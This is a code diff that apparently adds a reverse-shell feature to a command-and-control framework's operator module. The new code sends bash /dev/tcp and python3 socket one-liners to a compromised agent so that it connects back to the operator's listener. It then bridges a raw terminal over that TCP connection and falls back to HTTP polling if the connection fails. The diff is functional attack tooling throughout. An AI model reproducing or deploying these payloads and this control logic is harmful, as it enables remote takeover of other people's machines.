@@ -122,6 +122,79 @@ def _fast_http_shell(manager, agent_id):
                         pass
 
 
+def _send_task(manager, agent_id, cmd, label):
+    tid = manager.send_task(agent_id, "shell", {"command": cmd})
+    if tid:
+        _write(f"{Fore.CYAN}[*] {label}{Style.RESET_ALL}\n")
+    return tid
+
+
+def _pty_bridge(conn):
+    addr = conn.getpeername()
+    _write(f"{Fore.GREEN}[+] TCP shell from {addr}{Style.RESET_ALL}\n")
+    _write(f"{Fore.YELLOW}[*] Type 'exit' to return.{Style.RESET_ALL}\n")
+
+    old = termios.tcgetattr(0)
+    conn.setblocking(True)
+    try:
+        tty.setraw(0)
+        signal.signal(signal.SIGINT, signal.SIG_IGN)
+        while True:
+            r, _, _ = select.select([conn, 0], [], [])
+            if conn in r:
+                d = conn.recv(4096)
+                if not d:
+                    break
+                os.write(1, d)
+            if 0 in r:
+                d = os.read(0, 4096)
+                if not d:
+                    break
+                conn.send(d)
+    except (EOFError, BrokenPipeError, ConnectionResetError):
+        pass
+    except OSError:
+        pass
+    finally:
+        termios.tcsetattr(0, termios.TCSADRAIN, old)
+        try:
+            conn.close()
+        except OSError:
+            pass
+        _write(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}\n")
+
+
 def revshell(manager, agent_id, c2_server):
-    _write(f"{Fore.CYAN}[*] Starting shell via HTTP (fast polling){Style.RESET_ALL}\n")
+    _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{RS_PORT}{Style.RESET_ALL}\n")
+
+    # Try script-based shell (clean PTY over TCP)
+    payloads = [
+        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{RS_PORT}; script -q -c /bin/bash /dev/null <&3 >&3 2>&3'", "script bash"),
+        (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(10);s.connect(('{LOCAL_IP}',{RS_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh'],os.environ)\"", "python3"),
+    ]
+
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        srv.bind(("0.0.0.0", RS_PORT))
+        srv.listen(5)
+    except OSError:
+        _write(f"{Fore.YELLOW}[!] Port {RS_PORT} busy, use HTTP fallback{Style.RESET_ALL}\n")
+        _fast_http_shell(manager, agent_id)
+        return
+
+    srv.settimeout(5)
+    for payload, label in payloads:
+        _send_task(manager, agent_id, payload, label)
+        for _ in range(3):
+            try:
+                srv.settimeout(5)
+                conn, addr = srv.accept()
+                srv.close()
+                _pty_bridge(conn)
+                return
+            except socket.timeout:
+                continue
+    srv.close()
+    _write(f"{Fore.YELLOW}[!] TCP failed, HTTP fallback{Style.RESET_ALL}\n")
     _fast_http_shell(manager, agent_id)
